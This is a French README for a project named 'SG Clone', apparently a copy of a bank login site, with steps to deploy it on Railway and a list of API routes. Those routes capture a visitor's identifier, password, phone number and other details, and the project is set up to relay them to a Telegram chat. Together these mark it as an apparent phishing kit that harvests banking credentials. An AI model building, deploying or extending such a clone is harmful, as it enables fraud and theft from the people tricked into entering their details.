# SG Clone — FastAPI + React + MongoDB

Projet full-stack : backend FastAPI (Python), frontend React (CRA + Craco), MongoDB, notifications Telegram.

## Structure

```
/
├── backend/        # API FastAPI (Python)
│   ├── server.py
│   ├── requirements.txt
│   ├── Procfile
│   ├── railway.toml
│   ├── nixpacks.toml
│   └── .env.example
├── frontend/       # App React (CRA + Craco)
│   ├── src/
│   ├── package.json
│   ├── Procfile
│   ├── railway.toml
│   ├── nixpacks.toml
│   └── .env.example
└── railway.json
```

---

## 1) Pousser sur GitHub

Depuis l'interface Emergent : bouton **"Save to Github"** dans la barre de chat → connecter votre compte GitHub → choisir/créer le repo → **Push**.

> ⚠️ Les fichiers `backend/.env` et `frontend/.env` sont ignorés par git (voir `.gitignore`) — vos secrets (token Telegram) ne seront PAS poussés. Utilisez les `.env.example` comme modèle.

---

## 2) Déployer sur Railway

### Étape A — Créer un projet Railway

1. Aller sur https://railway.app → **New Project** → **Deploy from GitHub repo**
2. Sélectionner votre repo fraîchement poussé
3. Railway va proposer de détecter automatiquement les services

### Étape B — Ajouter MongoDB

1. Dans le projet → **+ New** → **Database** → **Add MongoDB**
2. Railway crée un service MongoDB et expose la variable `MONGO_URL`

### Étape C — Configurer le service Backend

1. **+ New** → **GitHub Repo** → votre repo
2. Dans **Settings** du service :
   - **Root Directory** : `backend`
   - **Start Command** : (laisser vide, Railway lit `Procfile`/`railway.toml`)
3. Dans **Variables** :
   ```
   MONGO_URL = ${{ MongoDB.MONGO_URL }}
   DB_NAME = sg_clone
   CORS_ORIGINS = *
   TELEGRAM_BOT_TOKEN = <votre_token>
   TELEGRAM_CHAT_ID = <votre_chat_id>
   ```
4. Dans **Settings → Networking → Generate Domain** → notez l'URL publique (ex: `https://backend-production-xxxx.up.railway.app`)

### Étape D — Configurer le service Frontend

1. **+ New** → **GitHub Repo** → même repo
2. Dans **Settings** :
   - **Root Directory** : `frontend`
3. Dans **Variables** :
   ```
   REACT_APP_BACKEND_URL = https://backend-production-xxxx.up.railway.app
   ```
   ⚠️ Remplacer par l'URL exacte du backend (étape C.4). **Cette variable est lue au moment du build**, donc si vous la modifiez plus tard, il faut redéployer le frontend.
4. **Settings → Networking → Generate Domain** → URL publique du frontend.

### Étape E — Mettre à jour CORS (recommandé)

Une fois l'URL du frontend connue, retournez sur le service **Backend → Variables** et changez :
```
CORS_ORIGINS = https://votre-frontend.up.railway.app
```
puis redéployez.

---

## 3) Lancement en local

### Backend
```bash
cd backend
cp .env.example .env       # puis renseigner vos valeurs
pip install -r requirements.txt
uvicorn server:app --reload --port 8001
```

### Frontend
```bash
cd frontend
cp .env.example .env       # mettre REACT_APP_BACKEND_URL=http://localhost:8001
yarn install
yarn start
```

---

## Variables d'environnement

### Backend (`backend/.env`)
| Variable | Description |
|---|---|
| `MONGO_URL` | Chaîne de connexion MongoDB |
| `DB_NAME` | Nom de la base |
| `CORS_ORIGINS` | Origine autorisée (URL frontend, ou `*`) |
| `TELEGRAM_BOT_TOKEN` | Token du bot (via @BotFather) |
| `TELEGRAM_CHAT_ID` | ID du chat/groupe Telegram |

### Frontend (`frontend/.env`)
| Variable | Description |
|---|---|
| `REACT_APP_BACKEND_URL` | URL publique du backend |

---

## Endpoints API

Toutes les routes sont préfixées par `/api`.

- `GET  /api/` — healthcheck
- `POST /api/track/session` — démarre une session, renvoie `session_id`
- `POST /api/track/identifier`
- `POST /api/track/password`
- `POST /api/track/phone`
- `POST /api/track/info`
- `POST /api/track/complete`
